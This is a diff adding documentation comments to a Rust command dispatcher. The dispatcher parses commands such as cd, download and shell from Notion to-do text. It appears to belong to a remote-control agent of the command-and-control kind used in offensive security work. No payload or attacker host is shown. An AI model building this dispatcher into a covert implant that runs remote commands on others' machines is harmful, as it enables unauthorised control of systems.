@@ -19,6 +19,7 @@ mod shell;
 mod shutdown;
 mod unknown;
 
+/// All the possible command types. Some have command strings, and some don't.
 pub enum CommandType {
     Cd(String),
     Download(String),
@@ -35,6 +36,8 @@ pub enum CommandType {
     Unknown(String)
 }
 
+/// Simple errors for the construction of a NotionCommand.
+/// Returned if construction fails.
 #[derive(Debug)]
 pub struct CommandError(String);
 
@@ -46,11 +49,13 @@ impl fmt::Display for CommandError {
 
 impl Error for CommandError {}
 
+/// The command itself, containing the `CommandType` enum
 pub struct NotionCommand {
     pub command_type: CommandType,
 }
 
 impl NotionCommand {
+    /// Constructor for `NotionCommands`. Takes the raw string from the `to_do`.
     pub fn from_string(command_str: String) -> Result<NotionCommand, CommandError> {
         let mut command_words = command_str.split(" ");
         // Taking the first command advances the iterator, so the remaining 
@@ -84,6 +89,7 @@ impl NotionCommand {
             Err(CommandError("Could not parse command!".to_string()))
         }
     }
+    /// Executes the appropriate function for the `command_type`. 
     pub async fn handle(&self, config_options: &mut ConfigOptions) -> Result<String, Box<dyn Error>> {
         match &self.command_type {
             CommandType::Cd(s)       => cd::handle(&s),
